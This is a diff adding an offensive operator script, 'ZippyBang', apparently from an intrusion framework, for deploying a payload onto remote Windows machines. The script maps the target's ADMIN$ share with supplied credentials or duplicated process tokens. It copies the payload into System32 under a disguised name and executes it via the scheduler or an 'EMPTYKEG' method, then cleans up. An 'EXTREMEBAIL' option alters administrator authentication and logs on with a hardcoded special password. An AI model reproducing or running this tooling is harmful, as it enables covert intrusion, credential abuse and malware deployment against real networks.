@@ -1,0 +1,1062 @@
+#------------------------------------------------------
+# File:	ZippyBang.eps
+#
+# Performs ZippyBang deployment
+#
+# Modifications:
+#	12/09/02	Created.
+#	05/04/04	Updated	for	EP 3.0
+#	02/02/06	A fairly large re-write.  Now, it uses tokens
+#               and has a more menu driven interface
+#	04/10/07	Includes EMPTYKEG and EXTREMEBAIL
+#------------------------------------------------------
+@include "_RecordToolUse.epm";
+
+# defaults
+string $version = "ZippyBang 2.1.0.4";
+
+_RecordToolUse("ZippyBang", $version);
+
+@echo off;
+
+echo "--------------------";
+echo "$version";
+echo "--------------------";
+
+if ($argc != 2)	{
+	echo "Usage: $argv[0] <targetMachine>\r\n";
+	return false;
+} else if ($argv[1]	== "?")	{
+	echo "Usage: $argv[0] <targetMachine>\r\n";
+	return false;
+}
+
+# This is passed around as a REF parameter into many of the functions
+# making it a structure makes the calling of functions easier
+
+struct ZippyBangParams {
+	string $target;
+	
+	string $share;
+	string $tmpName;
+	string $finalName;
+	
+	string $payload;
+	
+	bool $isToken;
+	bool $emkg;
+	string $tokenName;
+	string $tokenHandle;
+	string $user;
+	string $password;
+
+	bool $asOs;
+	string $os;
+	
+	string $drive;
+
+# these are not so much command paramters as current state variables	
+	int $stage;
+	bool $autoContinue;
+	int $credCmd;
+}
+
+# here is our parameters
+ZippyBangParams @params;
+
+# add \\ to	the	target name	if none	specified
+@params.$target = Split("\\\\", $argv[1]);
+if (sizeof(@params.$target)	> 1) {
+	@params.$target	= "\\\\@params.$target[1]";
+} else {
+	@params.$target	= "\\\\@params.$target[0]";
+}
+if (@params.$target	== "\\\\") {
+	echo "Invalid target (@params.$target)";
+	return false;
+}
+
+# default stuff
+@params.$share =	"ADMIN\$";
+@params.$tmpName	= "MSTE57.tmp";
+@params.$finalName =	"Spcss32.exe";
+# we've already got the default values (steps 1, 2, and 3)
+@params.$stage = 5;
+# this is close to the old style version
+@params.$autoContinue = true;
+@params.$emkg = true;
+#always use scheduler
+@params.$asOs = false;
+@params.$os = "scheduler";
+@params.$credCmd = -1;
+
+ClearAuthentication(@params);
+
+bool $res = true;
+
+# main menu loop
+int $quit		= 0;
+int $setShare		= 1;
+int $setTempName	= 2;
+int $setFinalName	= 3;
+int $emptykeg		= 4;
+int $enterPayload	= 5;
+int $enterCred		= 6;
+int $estabCred		= 7;
+int $viewProc		= 8;
+int $copyFile		= 9;
+int $execOnTar		= 10;
+
+string $commands;
+$commands[$quit]		= "Quit";
+$commands[$setShare]		= "Set Share";
+$commands[$setTempName]		= "Set Temporary File Name";
+$commands[$setFinalName]	= "Set Final File Name";
+$commands[$emptykeg]		= "Use EMPTYKEG [Default]";
+$commands[$enterPayload]	= "Enter payload exe";
+$commands[$enterCred]		= "Enter credentials information";
+$commands[$estabCred]		= "...";
+$commands[$viewProc]		= "View target processes";
+$commands[$copyFile]		= "Copy file to target?";
+$commands[$execOnTar]		= "Execute on target?";
+
+while(true) {
+	echo "";
+	echo "";
+	PrintCurrentConfig(@params);
+	echo "";
+	if(@params.$autoContinue) {
+		echo "(-1). Disable automatic continue";
+	} else {
+		echo "(-1). Enable automatic continue";
+	}
+	int $i = 0;
+	while($i <= @params.$stage) {
+		# first, the special lines
+		if($i == $estabCred) {
+			if(@params.$credCmd > -1) {
+				echo "($i). Stop netuse credentials";
+			} else {
+				echo "($i). Establish credentials with netuse";
+			}
+		} else {
+			echo "($i). $commands[$i]";
+		}
+		$i++;
+	}
+	
+	int $choice = GetInput("Enter the desired option");	
+	
+	if($choice == -1) {
+		if(@params.$autoContinue) {
+			@params.$autoContinue = false;
+		} else {
+			@params.$autoContinue = true;
+		}
+	}
+
+	if($choice == $quit) {
+		$res = false;
+		break;
+	}
+	
+	if($choice > @params.$stage) {
+		continue;
+	}
+
+	# enter the share name	
+	if($choice == $setShare) {
+		echo "";
+		echo "";
+
+		if(ChangeShare(@params.$share)) {
+			if(@params.$stage <= 1) {
+				@params.$stage = $setTempName;
+			}
+		}
+		
+	}
+	
+	# the temporary file name
+	if($choice == $setTempName) {
+		echo "";
+		echo "";
+
+		if(ChangeTemporaryFileName(@params.$tmpName)) {
+			if(@params.$stage <= $setTempName) {
+				@params.$stage = $setFinalName;
+			}
+		}
+		
+	}
+
+	# the final name on the target
+	if($choice == $setFinalName) {
+		echo "";
+		echo "";
+		
+		if(ChangeFinalFileName(@params.$finalName)) {
+			if(@params.$stage <= $setFinalName) {
+				@params.$stage = $emptykeg;
+			}
+		}
+	}
+
+	# BOOL to set EMPTYKEG or use Legacy
+	if($choice == $emptykeg) {
+		echo "";
+		echo "";
+		ifnot(prompt "Do you want to use EMPTYKEG?") {
+			@params.$emkg = false;
+		}
+
+		if(@params.$stage <= $emptykeg) {
+			@params.$stage = $enterPayload;
+		}
+	}
+
+	# enter the payload file
+	if($choice == $enterPayload) {
+		echo "";
+		echo "";
+		
+		if(GetPayloadFile(@params.$payload)) {
+			if(@params.$stage <= $enterPayload) {
+				@params.$stage = $enterCred;
+			}
+			if(@params.$autoContinue) {
+				$choice++;
+			}
+		}
+	}
+	
+	# enter the method to authenticate
+	if($choice == $enterCred) {
+		echo "";
+		echo "";
+		
+		if(GetCredentials(@params.$isToken, @params.$tokenName, @params.$tokenHandle, @params.$user, @params.$password, "Main Menu")) {
+			if(@params.$stage <= $enterCred) {
+				@params.$stage = $estabCred;
+			}
+			if(@params.$autoContinue) {
+				$choice++;
+			}
+		}
+	}
+	
+	if($choice == $estabCred) {
+		echo "";
+		echo "";
+		
+		if(EstablishCredentials(@params)) {
+			if(@params.$stage <= $estabCred) {
+				@params.$stage = $viewProc;
+			}
+			if(@params.$autoContinue) {
+				$choice++;
+			}
+		}
+	}
+	
+	if($choice == $viewProc) {
+		echo "";
+		echo "";
+		
+		if(ListRemoteProcesses(@params)) {
+			if(@params.$stage <= $viewProc) {
+				@params.$stage = $copyFile;
+			}
+			if(@params.$autoContinue) {
+				$choice++;
+			}
+		}
+	}
+	
+	# move the file to the target
+	if($choice == $copyFile) {
+		echo "";
+		echo "";
+		
+		if(TransferToTarget(@params)) {
+			if(@params.$stage <= $copyFile) {
+				@params.$stage = $execOnTar;
+			}
+			if(@params.$autoContinue) {
+				$choice++;
+			}
+		}
+	}
+	
+	# execute the file on the target
+	if($choice == $execOnTar) {
+		echo "";
+		echo "";
+		
+		if(ExecuteOnTarget(@params)) {
+			echo "Successfully completed ZippyBang";
+			if(@params.$stage <= $execOnTar) {
+				$res = true;
+				break;
+			}
+			if(@params.$autoContinue) {
+				$choice++;
+			}
+		}
+	}
+}
+
+return $res;
+
+#----------------------------------------------------------------------#
+sub PrintCurrentConfig(REF ZippyBangParams @params) {
+	echo "";
+	echo "Current Configuration:";
+	echo "Target : @params.$target";
+	if(@params.$stage > 3) {
+		echo "Share : @params.$share";
+		echo "EMPTYKEG : @params.$emkg";
+		echo "Tmp File : @params.$tmpName";
+		echo "Final File : @params.$finalName";
+	}
+	if(@params.$stage > 5) {
+		echo "Payload : @params.$payload";
+	}
+	if(@params.$stage > 5) {
+		echo "Credentials";
+		if(@params.$isToken) {
+			echo "\tUse Token";
+			echo "\t\t@params.$tokenName (@params.$tokenHandle)";
+		} else {
+			echo "\tdomain\\user = @params.$user";
+			echo "\tpassword = @params.$password";
+		}
+	}
+	if(@params.$stage > 5) {
+		echo "Delivery type";
+		if(@params.$asOs) {
+			echo "\tExecution method:  @params.$os";
+		} else {
+			echo "\tUse the scheduler";
+		}
+	}
+	if(@params.$stage > 6) {
+		echo "Credentials:";
+		if(@params.$isToken) {
+			echo "\tNot necessary";
+		} else {
+			if(@params.$credCmd > -1) {
+				echo "\tEstablished in command @params.$credCmd";
+			} else {
+				echo "\tNot established";
+			}
+		}
+	}
+	return true;
+}
+
+#----------------------------------------------------------------------#
+sub ChangeShare(REF string $share) {
+	echo "Changing target share";
+	echo "Current share:  $share";
+	$share = GetInput("Enter share name");
+	return true;
+}
+
+#----------------------------------------------------------------------#
+sub ChangeTemporaryFileName(REF string $tmpName) {
+	echo "Changing temporary file name";
+	echo "Current temporary file:  $tmpName";
+	$tmpName = GetInput("Enter temporary file name");
+	return true;
+}
+
+#----------------------------------------------------------------------#
+sub ChangeFinalFileName(REF string $finalName) {
+	echo "Changing final file name";
+	echo "Current final name:  $finalName";
+	$finalName = GetInput("Enter final file	name");
+	return true;
+}
+
+#----------------------------------------------------------------------#
+sub GetPayloadFile(REF string $file) {
+	echo "Select the target executable";
+	
+	string $tempPayload = GetInput("Enter payload exe");
+	ifnot(`local checkfile -name $tempPayload`) {
+		ifnot(prompt "Payload exe ($tempPayload) does not exist -- continue anyway?") {
+			return false;
+		}
+	}
+	$file = $tempPayload;
+	return true;
+}
+
+#----------------------------------------------------------------------#
+sub GetCredentials(REF bool $isToken, REF string $tokenName, REF string $tokenHandle, REF string $user, REF string $password, IN string $menuEscape) {
+	echo "Set authentication information";
+	#credentials
+	string $credentials;
+	$credentials[0] = $menuEscape;
+	$credentials[1] = "Provide Username and Password";
+	$credentials[2] = "Log On As User";
+	$credentials[3] = "Duplicate Token";
+	$credentials[4] = "EXTREMEBAIL";
+
+	while(true) {
+		string $viable;
+		string $values;
+		ifnot(getViableTokens($viable, $values)) {
+			echo "Unable to get current tokens";
+			continue;
+		}
+	
+		echo ""; 
+		int $i = 0;
+		while($i < sizeof($credentials)) {
+			echo "($i). $credentials[$i]";
+			$i++;
+		}
+		echo "Use an existing token";
+		# echo "(NOTE: If you use a token, you must use the scheduler option when setting target execution method)";
+		int $j = 0;
+		while($j < sizeof($viable)) {
+			echo "($i). Use Token $viable[$j] ($values[$j])";
+			
+			$i++;
+			$j++;
+		}
+		
+		int $choice = GetInput("Enter the desired option");
+		if($choice == 0) {
+			return false;
+		}
+		
+		# provide username and password
+		if($choice == 1) {
+			string $newUser;
+			string $newPass;
+			if(getUserPass($newUser, $newPass)) {
+				$user = $newUser;
+				$password = $newPass;
+				$isToken = false;
+				return true;
+			}
+			continue;
+		}
+		
+		# log on as a user
+		if($choice == 2) {
+			string $newFull;
+			string $newUser;
+			string $newPass;
+			string $newDomain;
+			if(getUserPass($newFull, $newPass)) {
+				if(getDomain($newFull, $newUser, $newDomain)) {
+					string $cmd = "logonasuser -user \"$newUser\" -password \"$newPass\" -domain \"$newDomain\"";
+				
+					echo "Executing $cmd";
+					ifnot(`$cmd`) {
+						echo "*** Unable to log on as user $newUser";
+					}
+				}
+			}
+			continue;
+		}
+		
+		if($choice == 3) {
+			echo "Running Processes:";
+			@echo on;
+			ifnot(`duplicatetoken -list`) {
+				echo "*** Unable to list tokens";
+				continue;
+			}
+			@echo off;
+			echo "Enter -1 to cancel";
+			int $id = GetInput("Enter process id");
+			if($id == -1) {
+				continue;
+			}
+			ifnot(`duplicatetoken -duplicate $id`) {
+				echo "*** Failed to duplicate token";
+			}
+			continue;
+		}
+
+		if($choice == 4) {
+			echo "";
+			echo "Modifying Authentication...";
+			echo "";
+
+			ifnot(`modifyauthentication -user administrator`) {
+				echo "*** Unable to ModifyAuthentication for Administrator";
+				continue;
+			}
+
+			ifnot(`logonasuser -user administrator -password ZAQ!nji(`) {
+				echo "*** Unable to logon with the special password";
+				continue;
+			}
+
+			continue;
+		}
+
+		# reset to deal with tokens
+		$choice -= sizeof($credentials);
+		if($choice < 0 || $choice > sizeof($viable)) {
+			continue;
+		}
+		$isToken = true;
+		$tokenName = $viable[$choice];
+		$tokenHandle = $values[$choice];
+		return true;
+		
+	}
+	return false;
+}
+
+#----------------------------------------------------------------------#
+sub EstablishCredentials(REF ZippyBangParams @params) {
+	if(@params.$credCmd > -1) {
+		if(prompt "Do you want to stop the current authentication? (Command @params.$credCmd)") {
+			if(`stop @params.$credCmd`) {
+				echo "Stopped";
+				@params.$credCmd = -1;
+			} else {
+				echo "Failed to stop";
+				ifnot(prompt "Would you like to return to the main menu?") {
+					return false;
+				}
+			}
+		}
+	}
+	if(@params.$isToken) {
+		echo "Using a token, you do not need to establish credentials";
+		return true;
+	}
+	echo "You may need to authenticate credentials against the target.";
+	echo "In certain situations, authentication is required.";
+	ifnot(prompt "Would you like to authenticate your credentials (using netuse)?") {
+		return true;
+	}
+
+	return EstabCred(@params);	
+}
+
+#----------------------------------------------------------------------#
+sub ListRemoteProcesses(REF ZippyBangParams @params) {
+	ifnot(prompt "Would you like to attempt to view the remote processes?") {
+		return true;
+	}
+	
+	bool $res = false;
+	string $prefix = "";
+	if(@params.$isToken) {
+		$prefix = "user=@params.$tokenName";
+	}
+	echo " ";
+	echo " ";
+	@echo on;
+	if (@params.$emkg) {
+		$res = `$prefix emptykeg -target @params.$target\\root\\cimv2 -plist`;
+	}
+	else {
+		$res = `$prefix pulist @params.$target`;
+	}
+	@echo off;
+	ifnot($res) {
+		echo "Unable to list remote processes.";
+		#echo "This could be caused by a domain setting.";
+		return prompt "Do you wish to ignore this impediment?";
+	}
+	echo " ";
+	echo " ";
+	return prompt "Given these processes, do you want to continue?";
+}
+
+#----------------------------------------------------------------------#
+sub TransferToTarget(REF ZippyBangParams @params) {
+	echo "Transfering to target";
+	bool $fileExists = false;
+	string $prefix;
+	if(@params.$isToken) {
+		$prefix = "user=@params.$tokenName";
+	} else {
+		$prefix = "";
+	}
+	
+	string $user;
+	string $domain;
+	ifnot(@params.$isToken) {
+		ifnot(getdomain(@params.$user, $user, $domain)) {
+			return false;
+		}
+	}
+	
+	echo "Checking for temp file";
+	if(`checkfile -name @params.$tmpName`) {
+		if(prompt "Temp file (@params.$tmpName) exists -- continue anyway?") {
+			$fileExists = true;
+		} else {
+			return false;
+		}
+	}
+
+	echo "Finding open drive letter";
+	@record on;
+	bool $listRet = `listdrives`;
+	@record off;
+	@params.$drive = "Z:";
+	if($listRet) {
+		string $drives = GetCmdData("drive");
+		bool $unknown = GetCmdData("is_drive_unknown");
+		int $i = sizeof($drives);
+		
+		while($i > 0) {
+			$i--;
+	
+			if($unknown[$i] == true) {
+				@params.$drive = $drives[$i];
+				break;
+			}
+		}
+		#remove slash
+		string $parts = Split("\\", @params.$drive);
+		@params.$drive = $parts[0];
+	}
+	
+	echo "    @params.$drive";
+	
+	if($fileExists == false) {
+		# put the temp file
+		echo "Uploading payload";
+		ifnot(`put @params.$payload -name @params.$tmpName`) {
+			echo "*** Failed to upload @params.$payload";
+			return false;
+		}
+	} else {
+		echo "Proceeding using existing temporary file";
+	}
+	
+	string $netuseStart;
+	if(@params.$isToken) {
+		$netuseStart = "$prefix netuse";
+	} else {
+		$netuseStart = "netuse -user \"$user\" -password \"@params.$password\" -domain \"$domain\"";
+	}
+	
+	#map the share
+	echo "Mapping @params.$share to @params.$drive";
+	string $cmd = "$netuseStart -remote \"@params.$target\\@params.$share\" -drive \"@params.$drive\" ";
+	echo "Executing '$cmd'";
+	@record on;
+	bool $res = `$cmd`;
+	@record off;
+	int $id = GetCmdData("LastCommandId");
+	ifnot($res) {
+		echo "*** Map of @params.$target\\@params.$share failed";
+		if(prompt "Delete payload?") {
+			`del @params.$tmpName`;
+		}
+		return false;
+	} else {
+		echo "    MAPPED to @params.$drive";
+	}
+	
+	string $drivePath = "@params.$drive\\System32";
+	
+	bool $rtn = true;
+	
+	# delete file from target (if it exists)
+	if (`$prefix checkfile -name "$drivePath\\@params.$finalName"`) {
+		`$prefix del "@params.$finalName" -path "$drivePath"`;
+	}
+	
+	# copy the file to the target
+	echo "Copying @params.$tmpName to $drivePath\\@params.$finalName";
+	ifnot(`$prefix copy @params.$tmpName "$drivePath\\@params.$finalName"`) {
+		echo "*** Copy Failed";
+		echo "    In the rare event that the copy failed because:";
+		echo "    1)  The file existed already AND";
+		echo "    2)  The file is actually the one you want to execute anyway";
+		if(prompt "Enter 'Yes' to return to the main menu.  Enter 'No' to continue anyway....") {
+			$rtn = false;
+		} else {
+			$rtn = true;
+		}
+	}
+	
+	# remove share
+	echo "Removing share";
+	
+	ifnot(`stop $id`) {
+		echo "*** Remove of share failed";
+		$rtn = false;
+	} else {
+		echo "    REMOVED";
+	}
+	
+	return $rtn;
+}
+
+#----------------------------------------------------------------------#
+sub ExecuteOnTarget(REF ZippyBangParams @params) {
+	string $cmd;
+	string $user;
+	string $domain;
+	ifnot(@params.$isToken) {
+		ifnot(getdomain(@params.$user, $user, $domain)) {
+			return false;
+		}
+	}
+	
+	string $drivePath = "@params.$drive\\System32";
+	bool $netuse = false;
+	string $prefix;
+	if(@params.$isToken) {
+		$prefix = "user=@params.$tokenName";
+	} else {
+		$prefix = "";
+	}
+	string $netuseStart;
+	if(@params.$isToken) {
+		$netuseStart = "$prefix netuse";
+	} else {
+		$netuseStart = "netuse -user \"$user\" -password \"@params.$password\" -domain \"$domain\"";
+	}
+	
+	# credentials should already be authenticated....
+	
+	# execute the file
+	# use creds
+	if(@params.$isToken) {
+		if (@params.$emkg) {
+			$cmd = "$prefix emkg_run @params.$finalName @params.$target";
+		}
+		else {
+			echo "Executing on target.  This may take up to two minutes.";
+			$cmd = "$prefix remoteexecute -target \"@params.$target\" -type @params.$os -command \"@params.$finalName\"";
+		}
+	} else {
+		if (@params.$emkg) {
+			$cmd = "emkg_run @params.$finalName @params.$target";
+		}
+		else {	
+			echo "Executing on target  This may take up to two minutes.";
+			$cmd = "remoteexecute -target \"@params.$target\" -user \"$user\" -domain \"$domain\" -password \"@params.$password\" -type @params.$os -command \"@params.$finalName\"";
+		}
+	}
+	
+	bool $rtn = `$cmd`;
+
+	
+	
+	if($rtn == false) {
+		#delete the remote payload
+		echo "Execute failed --	Mapping	drive to delete	payload";
+		string $cmd = "$netuseStart -remote \"@params.$target\\@params.$share\" -drive @params.$drive";
+		echo "Executing '$cmd'";
+		ifnot (`$cmd`) {
+			echo "*** Map of @params.$target\\@params.$share (for deletion) failed";
+		} else {
+			# mapped drive -- delete payload
+			
+			ifnot (`$prefix del "@params.$finalName" -path "$drivePath"`) {
+				echo "*** Unable to	delete target payload";
+			} else {
+				echo "	  Target payload deleted";
+				@params.$stage--;
+			}
+
+			# unmap	the	drive
+			echo "Removing shared drive	@params.$drive";
+			ifnot (`stop netuse	-contains @params.$drive`) {
+				echo "	  FAILED";
+			} else {
+				echo "	  REMOVED";
+			}
+		}
+	}
+	
+	ClearAuthentication(@params);
+	
+	echo "";
+	echo "";
+	# remove payload
+	if (prompt "Delete payload?") {
+		`$prefix del @params.$tmpName`;
+	}
+	return $rtn;
+}
+
+
+
+#----------------------------------------------------------------------#
+sub ProbeTarget(IN string $target, OUT string $suggestion, OUT bool $os) {
+	@record on;
+	bool $res = `machineinfo $target`;
+	@record off;
+	string $version = GetCmdData("os_version");
+	ifnot($res || defined($version)) {
+		echo "Could not probe target - you must choose another option";
+		return false;
+	}
+	if($version == "5.2" || $version == "5.002") {
+		$os = true;
+		$suggestion = "2003";
+		echo "Machine info suggests that this target is Windows 2003";
+	} else if($version == "5.1" || $version == "5.001") {
+		$os = true;
+		$suggestion = "xp";
+		echo "Machine info suggests that this target is Windows XP";
+	} else if($version == "5.0" || $version == "5.000") {
+		$os = true;
+		$suggestion = "2000";
+		echo "Machine info suggests that this target is Windows 2000";
+	} else if($version == "4.0" || $version == "4.000") {
+		$os = true;
+		$suggestion = "nt4";
+		echo "Machine info suggests that this target is Windows NT4";
+	} else {
+		$os = false;
+		$suggestion = "scheduler";
+		echo "Machine info cannot determine the os ($version).";
+		echo "This script suggests using the scheduler";
+	}
+	return true;
+}
+
+#----------------------------------------------------------------------#
+sub GetToken(REF string $tokenName, REF string $tokenHandle, IN string $menuEscape) {
+	string $tokens;
+	$tokens[0] = $menuEscape;
+	$tokens[1] = "Choose a currently available token";
+	$tokens[2] = "Duplicate a token";
+	while(true) {
+		echo "";
+		int $i = 0;
+		while($i < sizeof($tokens)) {
+			echo "($i). $tokens[$i]";
+			$i++;
+		}
+		int $choice = GetInput("Enter the desired option");
+		if($choice == 0) {
+			return false;
+		}
+		
+		if($choice > sizeof($tokens)) {
+			continue;
+		}
+		if($choice == 1) {
+			string $viable;
+			string $values;
+			ifnot(getViableTokens($viable, $values)) {
+				echo "Unable to get current tokens";
+				continue;
+			}
+			
+			while(true) {
+				echo "";
+				echo "Current tokens:";
+				
+				int $j = 0;
+				echo "(0) Back";
+				while($j < sizeof($viable)) {
+					int $k = $j;
+					$k++;
+					echo "($k). $viable[$j]";
+					$j++;
+				}
+				int $innerChoice = GetInput("Enter the desired option");
+				if($innerChoice == 0) {
+					break;
+				}
+				if($innerChoice < 0 || $innerChoice > sizeof($viable)) {
+					continue;
+				}
+				$innerChoice--;
+				$tokenName = $viable[$innerChoice];
+				$tokenHandle = $values[$innerChoice];
+				return true;
+			}
+		}
+		if($choice == 2) {
+			echo "Here are the running processes:";
+			@echo on;
+			bool $result = `duplicatetoken -list`;
+			@echo off;
+			ifnot($result) {
+				echo "Unable to review running processes";
+				continue;
+			}
+			echo "From which process do you wish to duplicate a token?";
+			int $procId = GetInput("Enter the process Id");
+			@record on;
+			$result = `duplicatetoken -duplicate $procId`;
+			@record off;
+			ifnot($result) {
+				echo "Unable to duplicate token";
+				continue;
+			}
+			echo "Token duplicated";
+		}
+		
+	}
+	return false;
+}
+
+#----------------------------------------------------------------------#
+sub getViableTokens(REF string $token, REF string $value) {
+	@record on;
+	`lpgetenv`;
+	@record off;
+	
+	string $envOption = GetCmdData("option");
+	string $envValue  = GetCmdData("value");
+	
+	ifnot(defined($envOption)) {
+		echo "Unable to list tokens";
+		return false;
+	}
+	string $viableTokens;
+	int $j = 0;
+	int $k = 0;
+	while($j < sizeof($envOption)) {
+		string $temp = split("_USER_", $envOption[$j]);
+		if(sizeof($temp) == 2) {
+			if(strlen($temp[0]) == 0) {
+				$token[$k] = $temp[1];
+				$value[$k] = $envValue[$j];
+				
+				$k++;
+			}
+		}
+		$j++;
+	}
+	return true;
+}
+
+#----------------------------------------------------------------------#
+sub getUserPass(OUT string $username, OUT string $password) {
+	$username = GetInput("Enter username");
+	echo "Enter (NULL) for no password";
+	$password = GetInput("Enter password");
+
+	if($password == "(NULL)") {
+		$password = "";
+	}
+	return true;
+
+}
+
+#----------------------------------------------------------------------#
+sub getDomain(IN string $fullName, OUT string $username, OUT string $domain) {
+	string $splitSlash = Split("\\", $fullName);
+	string $splitAt    = Split("\@", $fullName);
+	
+	if(sizeof($splitSlash) == 1 && sizeof($splitAt) == 1) {
+		$username = $fullName;
+		$domain = "";
+		return true;
+	}
+	
+	if(sizeof($splitSlash) == 2 && sizeof($splitAt) == 2) {
+		$username = $splitSlash[0];
+		$domain = $splitSlash[1];
+		if($domain == "localhost") {
+			$domain = "";
+		}
+		return false;
+	}
+	
+	if(sizeof($splitSlash) == 2) {
+		$domain = $splitSlash[0];
+		$username = $splitSlash[1];
+		if($domain == "localhost") {
+			$domain = "";
+		}
+		return true;
+	}
+	if(sizeof($splitAt) == 2) {
+		$username = $splitAt[0];
+		$domain = $splitAt[1];
+		if($domain == "localhost") {
+			$domain = "";
+		}
+		return true;
+	}
+	
+	$username = $fullName;
+	$domain = "";
+	return false;
+}
+
+#----------------------------------------------------------------------#
+sub ClearAuthentication(REF ZippyBangParams @params) {
+	bool $res = false;
+	@record on;
+	$res = `channels`;
+	@record off;
+	
+	ifnot($res) {
+		return false;
+	}
+	string $cmds	= GetCmdData("command");
+	int    $ids		= GetCmdData("id");
+	int $counter = 0;
+	while($counter < sizeof($cmds)) {
+		string $split1 = split("netuse", $cmds[$counter]);
+		string $split2 = split(@params.$target, $cmds[$counter]);
+		if(sizeof($split1) > 1) {
+			if(sizeof($split2) > 1) {
+				echo "Stopping command $ids[$counter]";
+				`stop $ids[$counter]`;
+			}
+		}
+		$counter++;
+	}
+	
+	return true;
+}
+
+#----------------------------------------------------------------------#
+sub EstabCred(REF ZippyBangParams @params) {
+	
+	ifnot(ClearAuthentication(@params)) {
+		return false;
+	}
+	
+	string $domain;
+	string $user;
+	
+	ifnot(getdomain(@params.$user, $user, $domain)) {
+		return false;
+	}
+	
+	string $prefix = "";
+	string $postfix = "";
+	if(@params.$isToken) {
+		$prefix = "user=@params.$tokenName";
+	} else {
+		$postfix = "-user \"$user\" -password \"@params.$password\" -domain \"$domain\"";
+	}
+	
+	string $cmd = "$prefix netuse -remote \"@params.$target\\@params.$share\" $postfix";
+	
+	echo "Establishing credentials via netuse";
+	@record on;
+	bool $result = `$cmd`;
+	@record off;
+	ifnot($result) {
+		echo "Unable to connect via netuse.  Check your credentials.";
+		pause;
+		return false;
+	}
+	@params.$credCmd = GetCmdData("LastCommandId");
+	
+	echo "Established.";
+
+	
+	return true;
+}
